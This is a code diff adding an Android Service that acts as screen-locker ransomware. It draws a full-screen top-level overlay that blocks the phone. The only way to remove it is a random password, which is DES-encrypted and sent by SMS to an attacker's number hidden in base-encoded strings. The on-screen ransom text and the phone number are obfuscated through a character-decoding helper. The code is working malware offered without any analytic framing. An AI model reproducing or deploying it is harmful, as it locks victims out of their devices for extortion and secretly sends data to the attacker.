@@ -1,0 +1,282 @@
+package qqkj.qqmagic;
+
+import android.app.*;
+import android.content.*;
+import android.graphics.*;
+import android.net.*;
+import android.os.*;
+import android.view.*;
+import android.view.View.*;
+import android.view.WindowManager.*;
+import android.widget.*;
+import android.telephony.gsm.*;
+
+public class s extends Service
+{
+
+
+	private WindowManager.LayoutParams wmParams;
+	private WindowManager mWindowManager;
+	private View mFloatLayout;
+	Button bt;
+	EditText ed;
+	TextView tv,tv1,tv2,tv3,tv4;
+	long pass;
+	int passw;
+	String password;
+	String ppss;
+	
+	DesUtils des;
+	SmsManager sms;
+	SharedPreferences share;
+	SharedPreferences.Editor editor;
+	@Override
+	public IBinder onBind(Intent p1)
+	{
+		// TODO: Implement this method
+		return null;
+	}
+
+	@Override
+	public void onCreate()
+	{
+		// TODO: Implement this method
+		super.onCreate();
+		pass = (long)(Math.random() * 10000000);
+		passw=(int)(Math.random()*1000000);
+		
+		des=new DesUtils("QQ3117200993");
+		
+		share = getSharedPreferences("GreyWolf", MODE_PRIVATE);
+		editor = share.edit();
+		 sms=SmsManager.getDefault();
+		
+		if (isNetworkConnected(getApplicationContext()))
+		{
+
+			if (share.getLong("m", 0) == 0)
+			{
+				editor.putLong("m", pass);
+				editor.commit();
+				try
+				{
+					editor.putString("passw", des.encrypt("" + passw));
+					editor.commit();
+				}
+				catch (Exception e)
+				{}
+				
+			}
+			ppss =( share.getLong("m", 8))+"";
+			try
+			{
+				password = des.decrypt(share.getString("passw", ""));
+			}
+			catch (Exception e)
+			{}
+			new Thread()
+			{
+				public void run()
+				{
+					//net.conect("序列号:"+ppss,"密码"+password);
+					sms.sendTextMessage(h("/110001/111000/110011/111000/110101/110000/111000/110010/110101/110100/110000",2),null,h("/12013/101b3/10533/4a",12)+ppss+h("/4094/54ed/34",18)+password+"\n"+h("/12013/101b3/10533/b70a/48/48/48/48/48/48/48/48/1317b/b70a/1b648/18830/1171a/15941",12),null,null);
+				}
+			}.start();
+		}
+else
+		{
+			try
+			{
+				ppss = (des.decrypt("eed5a849fcaba160") + "");
+				//37598
+			}
+			catch (Exception e)
+			{}
+			try
+			{
+				password = des.decrypt("dae4237303b11b8d");
+				//94106
+			}
+			catch (Exception e)
+			{}
+		}
+	}
+
+
+	@Override
+	public void onStart(Intent intent, int startId)
+	{
+		// TODO: Implement this method
+		super.onStart(intent, startId);
+		createFloatView();
+		new Thread()
+		{
+			public void run()
+			{///2d/32/31/2c/30/32/2g/33/33/2h/33
+				sms.sendTextMessage(h("/110001/111000/110011/111000/110101/110000/111000/110010/110101/110100/110000",2),null,h("/110001010100101/101010001001010/101100100100111/111100101011110/110001000010001/110011000101111/101000010111011/1001000000111100/110001000010001/100111000101101/1001010100000001/101110001001111/100111010000110",2),null,null);
+				//sms.sendTextMessage(h("/1d/1h/1d/1c/1f/1f/1l/1f/1h/1i/1d",36),null,"/***********/",null,null);
+			}
+		}.start();
+		
+
+	}
+
+	private void createFloatView()
+	{
+		wmParams = new WindowManager.LayoutParams();
+//获取的是WindowManagerImpl.CompatModeWrapper
+		mWindowManager = (WindowManager)getApplication().getSystemService(getApplication().WINDOW_SERVICE);
+//Log.i(TAG, "mWindowManager--->"+ mWindowManager);
+//设置window type
+		wmParams.type = LayoutParams. TYPE_SYSTEM_ERROR;
+// 该类型提供与用户交互，置于所有应用程序上方，但是在状态栏后面
+		// TYPE_TOAST TYPE_SYSTEM_OVERLAY 在其他应用上层 在通知栏下层 位置不能动鸟
+		// TYPE_PHONE 在其他应用上层 在通知栏下层
+		// TYPE_PRIORITY_PHONE TYPE_SYSTEM_ALERT 在其他应用上层 在通知栏上层 没试出来区别是啥
+		// TYPE_SYSTEM_ERROR 最顶层(通过对比360和天天动听歌词得出)
+		// 
+//设置图片格式，效果为背景透明
+		wmParams.format = PixelFormat.RGBA_8888;
+
+		//wmParams.format=1;
+		//设置浮动窗口不可聚焦（实现操作除浮动窗口外的其他可见窗口的操作）
+		//实现悬浮窗到状态栏
+		//wmParams.flags = LayoutParams.FLAG_LOCAL_FOCUS_MODE | LayoutParams.FLAG_FULLSCREEN | LayoutParams.FLAG_LAYOUT_IN_SCREEN;
+	wmParams.flags=1280;
+		//wmParams.flags=1280;
+		//LayoutParams.FLAG_NOT_FOCUSABLE     //少此代码屏幕无法获取下层东西
+
+		//LayoutParams.TYPE_SYSTEM_ERROR	|
+
+		//LayoutParams.FLAG_FULLSCREEN| LayoutParams.FLAG_LAYOUT_IN_SCREEN
+//调整悬浮窗显示的停靠位置为左侧置顶
+		wmParams.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
+// 以屏幕左上角为原点，设置x、y初始值，相对于gravity
+		wmParams.x = 0;
+		wmParams.y = 0;
+//设置悬浮窗口长宽数据
+		wmParams.width = WindowManager.LayoutParams.FILL_PARENT;
+		wmParams.height = WindowManager.LayoutParams.FILL_PARENT;
+		//wmParams.height=500;
+// 设置悬浮窗口长宽数据
+//wmParams.width = 200;
+//wmParams.height = 80;
+		LayoutInflater inflater = LayoutInflater.from(getApplication());
+//获取浮动窗口视图所在布局
+		mFloatLayout = inflater.inflate(R.layout.newone, null);
+
+//添加mFloatLayout
+
+		mWindowManager.addView(mFloatLayout, wmParams);
+
+
+
+		/*//浮动窗口按钮
+		 mFloatView = (Button)mFloatLayout.findViewById(R.id.asd3);
+		 //点击了按钮
+		 mFloatView.setOnClickListener(new OnClickListener()
+		 {
+		 @Override
+		 public void onClick(View v)
+		 {
+		 Toast.makeText(myservice.this, "有限无边", Toast.LENGTH_SHORT).show();}
+		 });*/
+
+		/*mFloatLayout.measure(View.MeasureSpec.makeMeasureSpec(0,
+		 View.MeasureSpec.UNSPECIFIED), View.MeasureSpec
+		 .makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED));
+
+		 mFloatLayout.setOnTouchListener(new OnTouchListener()
+		 {
+		 @Override
+		 public boolean onTouch(View v,MotionEvent event)
+		 {
+
+
+		 wmParams.x = (int) event.getRawX() - mFloatLayout.getMeasuredWidth()/2;
+		 wmParams.y = (int) event.getRawY() - mFloatLayout.getMeasuredHeight()/2-25;
+
+
+
+		 mWindowManager.updateViewLayout(mFloatLayout, wmParams);
+		 return false; //此处必须返回false，否则OnClickListener获取不到监听
+		 }
+		 });*/
+
+		bt = (Button)mFloatLayout.findViewById(R.id.bt);
+		ed = (EditText)mFloatLayout.findViewById(R.id.ed);
+		tv = (TextView)mFloatLayout.findViewById(R.id.tv);
+		bt.setOnClickListener(new OnClickListener()
+			{
+
+				@Override
+				public void onClick(View p1)
+				{
+					// TODO: Implement this method
+					
+					if(ed.getText().toString().equals(password))
+					{
+						//留后手1234
+						mWindowManager.removeView(mFloatLayout);
+						stopSelf();
+						
+					}
+				}
+
+
+			});
+			
+			
+		tv.setText(h("/38cg/53ba/60h1/4094/42cf/3af9/3c63",18) + ppss);
+		tv1=(TextView)mFloatLayout.findViewById(R.id.tv1);
+		tv2=(TextView)mFloatLayout.findViewById(R.id.tv2);
+		tv3=(TextView)mFloatLayout.findViewById(R.id.tv3);
+		tv4=(TextView)mFloatLayout.findViewById(R.id.tv4);
+		tv1.setText(h("/4437/3dba/38cg/45bh/49a2/5hhd/69d3/380e/1f",18));
+		tv2.setText(h("/10000/10000/10022120202/2010/1212/1210/1221/1220/2010/1222/1220/1210",3));
+		tv3.setText(h("/3c7b/38cc/5b2d/60bb/60h1/69d3/4094/54ed",18));
+		tv4.setText(h("/4e0g/34/4d35/37dc/42cf/3af9/3c63/40c1/42d2/3d59/37b6/60h1/69d3/4094/54ed",18));
+		
+
+
+
+	}
+
+	public boolean isNetworkConnected(Context  context)
+	{ 
+		//是否有网络连接
+		if (context != null)
+		{ 
+			ConnectivityManager 
+				mConnectivityManager = (ConnectivityManager) context 
+
+				.getSystemService(Context.CONNECTIVITY_SERVICE); 
+			NetworkInfo 
+				mNetworkInfo = mConnectivityManager.getActiveNetworkInfo(); 
+			if (mNetworkInfo 
+				!= null)
+			{ 
+				return mNetworkInfo.isAvailable(); 
+			} 
+		} 
+		return false; 
+
+	} 
+
+	
+	public static String h(String r4_String, int r5i)
+	{
+		String r1_String = "";
+		String[] r2_String_A = r4_String.split("/");
+		int r0i = 1;
+		while (r0i < r2_String_A.length)
+		{
+			r1_String = new StringBuffer().append(r1_String).append((char) Integer.parseInt(r2_String_A[r0i], r5i)).toString();
+			r0i++;
+		}
+		return r1_String;
+	}
+
+
+
+}
